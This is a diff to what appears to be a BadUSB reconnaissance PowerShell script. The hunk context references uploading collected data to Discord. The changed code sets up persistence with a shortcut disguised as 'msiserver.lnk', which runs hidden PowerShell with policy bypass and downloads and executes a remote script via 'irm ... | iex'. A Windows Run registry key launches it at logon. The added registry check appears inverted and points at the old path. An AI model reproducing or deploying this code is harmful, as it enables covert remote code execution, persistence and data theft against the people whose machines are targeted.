@@ -704,18 +704,47 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
-if(![System.IO.File]::Exists($env:USERPROFILE+"\msiserver.lnk")){
+if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
-	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\msiserver.lnk")
+	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
 	$target = "powershell"
 	$args = "-Nop -Noni -w h -ep bypass -command `"`$dc='"+$dc+"';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
-	$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
-	$val = $env:USERPROFILE+"\msiserver.lnk"
-	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
-	New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
+}
+
+
+function Test-RegistryValue {
+
+param (
+
+ [parameter(Mandatory=$true)]
+ [ValidateNotNullOrEmpty()]$Path,
+
+[parameter(Mandatory=$true)]
+ [ValidateNotNullOrEmpty()]$Value
+)
+
+try {
+
+Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
+ return $true
+ }
+
+catch {
+
+return $false
+
+}
+
+}
+$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
+$val = $env:USERPROFILE+"\msiserver.lnk"
+$testVal = Test-RegistryValue -Path $path -Value $val
+if ($testVal -eq $true){
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
+New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
 }
 
 ############################################################################################################################################################
